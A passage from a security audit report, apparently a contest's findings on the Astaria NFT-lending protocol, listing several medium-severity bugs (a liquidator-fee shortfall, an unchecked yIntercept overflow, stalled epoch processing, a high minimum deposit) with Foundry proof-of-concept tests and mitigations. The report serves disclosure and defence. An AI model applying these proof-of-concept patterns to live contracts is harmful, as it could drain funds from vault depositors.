class=\"grvsc-source\">import {FixedPointMathLib} from &quot;solmate/utils/FixedPointMathLib.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {MockERC721} from &quot;solmate/test/utils/mocks/MockERC721.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  MultiRolesAuthority</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">} from &quot;solmate/auth/authorities/MultiRolesAuthority.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {ERC721} from &quot;gpl/ERC721.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {SafeCastLib} from &quot;gpl/utils/SafeCastLib.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {IAstariaRouter, AstariaRouter} from &quot;../AstariaRouter.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {VaultImplementation} from &quot;../VaultImplementation.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {PublicVault} from &quot;../PublicVault.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {TransferProxy} from &quot;../TransferProxy.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {WithdrawProxy} from &quot;../WithdrawProxy.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {Vault} from &quot;../Vault.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {Strings2} from &quot;./utils/Strings2.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import &quot;./TestHelpers.t.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {OrderParameters} from &quot;seaport/lib/ConsiderationStructs.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract AstariaTest is TestHelpers {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  using FixedPointMathLib for uint256;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  using CollateralLookup for address;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  using SafeCastLib for uint256;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  event NonceUpdated(uint256 nonce);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  event VaultShutdown();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function testProfitFromLiquidatorFee() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    TestNFT nft = new TestNFT(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address tokenContract = address(nft);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 tokenId = uint256(0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address publicVault = _createPublicVault({</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      strategist: strategistOne,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      delegate: strategistTwo,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      epochLength: 7 days</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _lendToVault(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      Lender({addr: address(1), amountToLend: 60 ether}),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      publicVault</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    (, ILienToken.Stack[] memory stack) = _commitToLien({</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      vault: publicVault,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      strategist: strategistOne,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      strategistPK: strategistOnePK,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      tokenContract: tokenContract,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      tokenId: tokenId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      lienDetails: ILienToken.Details({</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        maxAmount: 50 ether,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        rate: (uint256(1e16) * 150) / (365 days),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        duration: 10 days,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        maxPotentialDebt: 0 ether,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        liquidationInitialAsk: 42 ether</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      }),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      amount: 40 ether,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      isFirstLien: true</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.warp(block.timestamp + 10 days);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    OrderParameters memory listedOrder = ASTARIA_ROUTER.liquidate(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      stack,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      uint8(0)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _bid(Bidder(bidder, bidderPK), listedOrder, 42 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    assertTrue(WETH9.balanceOf(publicVault) &lt; 57 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<h3 id=\"tools-used-9\" style=\"position:relative;\"><a href=\"#tools-used-9\" aria-label=\"tools used 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode, Foundry</p>\n<h3 id=\"recommended-mitigation-steps-28\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-28\" aria-label=\"recommended mitigation steps 28 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Include liquidator reward in the calculation of potential debt.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/400#issuecomment-1416270111\">androolloyd (Astaria) disputed and commented</a>:</strong></p>\n<blockquote>\n<p>This is working as intended.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/400#issuecomment-1441302402\">Picodes (judge) commented</a>:</strong></p>\n<blockquote>\n<p>@androolloyd could you expand on this? Wouldn’t it be safer and avoid eventual loss of funds to ensure that the eventual liquidator reward is included in <code>liquidationInitialAsk</code>?</p>\n</blockquote>\n<hr>\n<h2 id=\"m-12-yintercept-of-public-vaults-can-overflow\" style=\"position:relative;\"><a href=\"#m-12-yintercept-of-public-vaults-can-overflow\" aria-label=\"m 12 yintercept of public vaults can overflow permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/388\">[M-12] yIntercept of public vaults can overflow</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/388\">evan</a></em></p>\n<p>The yIntercept of a public vault can overflow due to an unchecked addition. As a result, totalAsset will be a lot lower than the actual amount, which prevents liquidity providers from withdrawing a large fraction of their assets.</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L323-L325\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L323-L325</a></p>\n<p>The amount of assets required for this to happen is barely feasible for a regular 18 decimal ERC20 token, but can happen with ease for tokens with higher precision.</p>\n<h3 id=\"proof-of-concept-30\" style=\"position:relative;\"><a href=\"#proof-of-concept-30\" aria-label=\"proof of concept 30 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"81\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">pragma solidity =0.8.17;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import &quot;forge-std/Test.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {Authority} from &quot;solmate/auth/Auth.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {FixedPointMathLib} from &quot;solmate/utils/FixedPointMathLib.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {MockERC721} from &quot;solmate/test/utils/mocks/MockERC721.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  MultiRolesAuthority</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">} from &quot;solmate/auth/authorities/MultiRolesAuthority.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {ERC721} from &quot;gpl/ERC721.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {SafeCastLib} from &quot;gpl/utils/SafeCastLib.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {IAstariaRouter, AstariaRouter} from &quot;../AstariaRouter.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {VaultImplementation} from &quot;../VaultImplementation.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {PublicVault} from &quot;../PublicVault.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {TransferProxy} from &quot;../TransferProxy.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {WithdrawProxy} from &quot;../WithdrawProxy.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {Strings2} from &quot;./utils/Strings2.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import &quot;./TestHelpers.t.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {OrderParameters} from &quot;seaport/lib/ConsiderationStructs.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract AstariaTest is TestHelpers {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  using FixedPointMathLib for uint256;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  using CollateralLookup for address;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  using SafeCastLib for uint256;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  event NonceUpdated(uint256 nonce);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  event VaultShutdown();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function testYinterceptOverflow() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address publicVault = _createPublicVault({</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      strategist: strategistOne,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      delegate: strategistTwo,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      epochLength: 14 days</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _lendToVault(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      Lender({addr: address(1), amountToLend: 309000000 ether}),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      publicVault</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _lendToVault(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      Lender({addr: address(2), amountToLend: 10000000 ether}),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      publicVault</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    assertTrue(PublicVault(publicVault).totalAssets() &lt; 10000000 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<h3 id=\"tools-used-10\" style=\"position:relative;\"><a href=\"#tools-used-10\" aria-label=\"tools used 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode, Foundry</p>\n<h3 id=\"recommended-mitigation-steps-29\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-29\" aria-label=\"recommended mitigation steps 29 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Remove the unchecked block.</p>\n<hr>\n<h2 id=\"m-13-processing-an-epoch-must-be-done-in-a-timely-manner-but-can-be-halted-by-non-liquidated-expired-liens\" style=\"position:relative;\"><a href=\"#m-13-processing-an-epoch-must-be-done-in-a-timely-manner-but-can-be-halted-by-non-liquidated-expired-liens\" aria-label=\"m 13 processing an epoch must be done in a timely manner but can be halted by non liquidated expired liens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/369\">[M-13] Processing an epoch must be done in a timely manner, but can be halted by non liquidated expired liens</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/369\">obront</a></em></p>\n<p>As pointed out in the <a href=\"https://github.com/spearbit-audits/review-astaria/issues/121\">Spearbit audit</a>:</p>\n<blockquote>\n<p>If the processEpoch() endpoint does not get called regularly (especially close to the epoch boundaries), the updated currentEpoch would lag behind the actual expected value and this will introduce arithmetic errors in formulas regarding epochs and timestamps.</p>\n</blockquote>\n<p>This can cause a problem because <code>processEpoch()</code> cannot be called when there are open liens, and liens may remain open in the event that a lien expires and isn’t promptly liquidated.</p>\n<h3 id=\"proof-of-concept-31\" style=\"position:relative;\"><a href=\"#proof-of-concept-31\" aria-label=\"proof of concept 31 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><code>processEpoch()</code> contains the following check to ensure that all liens are closed before the epoch is processed:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"82\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">if (s.epochData[s.currentEpoch].liensOpenForEpoch &gt; 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  revert InvalidState(InvalidStates.LIENS_OPEN_FOR_EPOCH_NOT_ZERO);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>The accounting considers a lien open (via <code>s.epochData[s.currentEpoch].liensOpenForEpoch</code>) unless this value is decremented, which happens in three cases: when (a) the full payment is made, (b) the lien is bought out, or (c) the lien is liquidated.</p>\n<p>In the event that a lien expires and nobody calls <code>liquidate()</code> (for example, if the NFT seems worthless and no other user wants to pay the gas to execute the function for the fee), this would cause <code>processEpoch()</code> to fail, and could create delays in the epoch processing and cause the accounting issues pointed out in the previous audit.</p>\n<h3 id=\"recommended-mitigation-steps-30\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-30\" aria-label=\"recommended mitigation steps 30 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Astaria should implement a monitoring solution to ensure that <code>liquidate()</code> is always called promptly for expired liens, and that <code>processEpoch()</code> is always called promptly when the epoch ends.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/369#issuecomment-1412914783\">SantiagoGregory (Astaria) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>Yes, us and strategists know to be monitoring vaults to process epochs.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-14-mindepositamount-is-unnecessarily-high-can-price-out-many-users\" style=\"position:relative;\"><a href=\"#m-14-mindepositamount-is-unnecessarily-high-can-price-out-many-users\" aria-label=\"m 14 mindepositamount is unnecessarily high can price out many users permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/367\">[M-14] <code>minDepositAmount</code> is unnecessarily high, can price out many users</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/367\">obront</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/631\">Tointer</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/627\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/523\">0xcm</a>, and <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/241\">zaskoh</a></em></p>\n<p>The <code>minDepositAmount()</code> function is intended to ensure that all depositors into Public Vaults are depositing more than dust to protect against attacks like the 4626 front running attack. It is calculated as follows:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"83\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  function minDepositAmount()</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    public</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    view</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    virtual</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    override(ERC4626Cloned)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    returns (uint256)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (ERC20(asset()).decimals() == uint8(18)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      return 100 gwei;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      return 10**(ERC20(asset()).decimals() - 1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span></code></pre>\n<p>For assets with 18 decimals, this calculation is totally reasonable, as the minimum deposit is just 100 gwei (1/10k of a USD). However, for other assets, the formula returns 0.1 tokens, regardless of value.</p>\n<p>While this may be fine for low-priced tokens, it leads to a minimum deposit for tokens like WBTC to be over <code>$2000</code> USD, certainly too high for many user and not aligned with the intended behavior (which can be seen in the 18 decimal base case).</p>\n<h3 id=\"proof-of-concept-32\" style=\"position:relative;\"><a href=\"#proof-of-concept-32\" aria-label=\"proof of concept 32 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ul>\n<li>WBTC is 8 decimals and has a value of ~$20k USD</li>\n<li>the minimum deposit is calculated as <code>return 10**(ERC20(asset()).decimals() - 1);</code></li>\n<li>for WBTC, this would return <code>10 ** 7</code></li>\n<li><code>20,000 * (10 ** 7) / (10 ** 8)</code> = <code>2000 USD</code></li>\n</ul>\n<p>This is far out of line with the <code>1/10,000 USD</code> expected for tokens with 18 decimals.</p>\n<h3 id=\"recommended-mitigation-steps-31\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-31\" aria-label=\"recommended mitigation steps 31 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" 